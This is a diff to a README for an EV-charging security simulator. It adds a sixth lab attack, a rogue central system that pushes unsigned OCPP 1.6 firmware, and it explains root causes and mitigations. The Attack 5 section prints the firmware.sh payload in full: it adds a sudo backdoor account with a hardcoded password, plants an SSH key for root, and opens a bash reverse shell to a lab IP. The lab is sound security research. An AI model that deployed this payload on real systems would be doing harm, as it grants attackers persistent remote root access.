@@ -12,9 +12,9 @@ EVSecSim simulates a minimal EV charging ecosystem consisting of:
 
 - A **CSMS** (Central System / Charge Point Management System) over WebSocket
 - An **EVSE client** (EV Supply Equipment) backed by a live pandapower grid twin
-- Five **attack scripts** demonstrating published OCPP 1.6 vulnerabilities across both internal and external threat models
+- Six **attack scripts** demonstrating published OCPP 1.6 vulnerabilities across both internal and external threat models
 
-The attacks target weaknesses documented by SaiFlow (2023) and Idaho National Laboratory (INL/CON-23-72329, 2023): no transport encryption, no message authentication, no connection deduplication, and no charge-point identity verification.
+The attacks target weaknesses documented by SaiFlow (2023) and Idaho National Laboratory (INL/CON-23-72329, 2023): no transport encryption, no message authentication, no connection deduplication, no charge-point identity verification, and no firmware signature verification.
 
 ---
 
@@ -36,6 +36,7 @@ SUTDEVsec/
     ├── attack_mitm_session_patched.py  # Attack 3a: MITM proxy — internal (operator-net)
     ├── attack_mitm_ext.py              # Attack 3b: MITM proxy — external (public-net)
     ├── attack_load_altering.py         # Attack 4:  Coordinated botnet load altering
+    ├── attack_firmware.py              # Attack 5:  Malicious firmware update / RCE
     └── a6breakers.py                   # Grid topology visualiser (Plotly HTML)
 ```
 
@@ -72,19 +73,19 @@ Each component runs in its own container on a logically separate network segment
   │                          │          │          │                                │
   │         ┌────────────────┘          │          └────────────────┐               │
   │         ▼                           ▼                           ▼               │
-  │  ┌─────────────┐         ┌───────────────────┐       ┌──────────────────┐      │
-  │  │    evse      │         │     atk-fdi        │       │    atk-mitm      │      │
-  │  │ 172.19.0.20  │         │   172.19.0.30      │       │  172.19.0.40     │      │
-  │  │ (legit EVSE) │         │ (compromised EVSE) │       │  proxy :9001     │      │
-  │  └─────────────┘         └───────────────────┘       └────────┬─────────┘      │
-  │                                                                 │                │
-  │                                                   ws://atk-mitm:9001            │
-  │                                                                 ▼                │
-  │                                                  ┌─────────────────────┐        │
-  │                                                  │   evse-via-mitm     │        │
-  │                                                  │   172.19.0.50       │        │
-  │                                                  └─────────────────────┘        │
-  └───────────────────────────────────────────────────────────────────────────────── ┘
+  │  ┌─────────────┐   ┌───────────────────┐   ┌──────────────────┐   ┌───────────────────┐  │
+  │  │    evse      │   │     atk-fdi        │   │    atk-mitm      │   │   atk-firmware    │  │
+  │  │ 172.19.0.20  │   │   172.19.0.30      │   │  172.19.0.40     │   │   172.19.0.30     │  │
+  │  │ (legit EVSE) │   │ (compromised EVSE) │   │  proxy :9001     │   │ rogue CSMS :9000  │  │
+  │  └─────────────┘   └───────────────────┘   └────────┬─────────┘   │ payload HTTP :8080 │  │
+  │                                                       │             └────────┬──────────┘  │
+  │                                           ws://atk-mitm:9001                │              │
+  │                                                       ▼                      ▼              │
+  │                                          ┌──────────────────┐   ┌──────────────────────┐   │
+  │                                          │   evse-via-mitm  │   │  evse-via-firmware   │   │
+  │                                          │   172.19.0.50    │   │  172.19.0.60         │   │
+  │                                          └──────────────────┘   └──────────────────────┘   │
+  └────────────────────────────────────────────────────────────────────────────────────────────┘
 ```
 
 ### Threat model per attack
@@ -96,6 +97,7 @@ Each component runs in its own container on a logically separate network segment
 | 3a | MITM — Internal | Compromised network device | operator-net | Yes | ARP poisoning / rogue switch |
 | 3b | MITM — External | External attacker | public-net | No | BGP hijack / DNS poisoning / rogue cloud proxy |
 | 4 | Load Altering | External botnet | public-net | No | Direct WebSocket to exposed CSMS port |
+| 5 | Malicious Firmware Update | Rogue / compromised CSMS | operator-net | Yes | DNS poisoning / compromised CSMS platform |
 
 ---
 
@@ -125,6 +127,9 @@ docker compose --profile mitm-ext up --build
 
 # Attack 4 — Coordinated load altering  (external botnet, 10 bots)
 docker compose --profile load up --build
+
+# Attack 5 — Malicious firmware update  (rogue CSMS, no real CSMS started)
+docker compose --profile firmware up --build
 ```
 
 Drop `--build` on repeat runs if no code has changed.
@@ -140,6 +145,8 @@ docker logs -f csms
 docker logs -f atk-fdi
 docker logs -f atk-mitm
 docker logs -f atk-mitm-ext
+docker logs -f atk-firmware
+docker logs -f evse-via-firmware
 ```
 
 ### Tear down
@@ -168,6 +175,14 @@ Wireshark filters by attack:
 | MITM internal | `websocket && (tcp.port == 9000 or tcp.port == 9001)` |
 | MITM external | `websocket && (tcp.port == 9000 or tcp.port == 9002)` |
 | SaiFlow / Load | `websocket && ip.dst == 172.20.0.10` |
+| Firmware | `websocket && ip.dst == 172.19.0.30` |
+
+For Attack 5 also capture the HTTP payload delivery (port 8080 is published to host):
+
+```bash
+# See the malicious firmware file served to the EVSE
+curl http://localhost:8080/firmware.sh
+```
 
 ---
 
@@ -202,6 +217,13 @@ python core/evse_client4_fixed.py --url ws://127.0.0.1:9001
 
 # Terminal 2 — EVSE via external MITM proxy (port 9002)
 python core/evse_client4_fixed.py --url ws://127.0.0.1:9002
+
+# Attack 5 — rogue CSMS replaces the real one; EVSE connects to it
+# Terminal 1 (rogue CSMS + HTTP payload server):
+python attacks/attack_firmware.py
+
+# Terminal 2 (EVSE — points at rogue CSMS, NOT the real one):
+python core/evse_client4_fixed.py --url ws://127.0.0.1:9000
 ```
 
 ---
@@ -324,6 +346,43 @@ python attacks/attack_load_altering.py --bots 500   # full fleet takeover
 
 **Root cause:** No per-CP rate limiting; no operator-signed charging profiles.  
 **Mitigation:** OCPP 2.0.1 `SetChargingProfile` with signed profiles; CSMS anomaly detection; grid-side ROCOL protection relays.
+
+---
+
+### Attack 5 — Malicious Firmware Update / Remote Code Execution
+
+**Script:** `attacks/attack_firmware.py`  
+**Profile:** `firmware`  
+**Network:** operator-net (172.19.0.30)  
+**Based on:** INL/CON-23-72329 PoC #3
+
+OCPP 1.6 `UpdateFirmware` carries a plain HTTP/FTP URL and a scheduled retrieval time. There is no firmware signature field, no certificate, and no integrity hash. The EVSE trusts the URL unconditionally and installs whatever is served.
+
+This script acts as a **rogue CSMS** and simultaneously runs an embedded HTTP server serving a malicious shell script payload. No real CSMS is started in the `firmware` profile — `atk-firmware` replaces it entirely.
+
+| Phase | Description |
+|-------|-------------|
+| 1 — Normal operation (0–10 s) | EVSE connects, boots, sends MeterValues normally. No OCPP mechanism exists to verify CSMS identity. |
+| 2 — Firmware push (t = 10 s) | Rogue CSMS sends `UpdateFirmware` pointing at `http://atk-firmware:8080/firmware.sh`. |
+| 3 — Payload execution | EVSE downloads the script, prints its full contents, walks through `Downloading → Downloaded → Installing → Installed` with no integrity check at any step. |
+
+**Payload delivered to EVSE (`firmware.sh`):**
+```sh
+useradd -m -s /bin/bash backdoor
+echo 'backdoor:EV$ecr3t!' | chpasswd
+usermod -aG sudo backdoor
+echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
+nohup bash -i >& /dev/tcp/172.19.0.30/4444 0>&1 &
+```
+
+```bash
+python attacks/attack_firmware.py
+python attacks/attack_firmware.py --push-delay 5
+python attacks/attack_firmware.py --firmware-host atk-firmware --push-delay 10
+```
+
+**Root cause:** `UpdateFirmware` in OCPP 1.6 has no signature field; EVSE has no way to verify CSMS identity (no mutual TLS).  
+**Mitigation:** OCPP 2.0.1 `SignedUpdateFirmware` with X.509 certificate chain; mutual TLS on CSMS WebSocket; EVSE-side firmware hash and signature verification before installation.
 
 ---
 
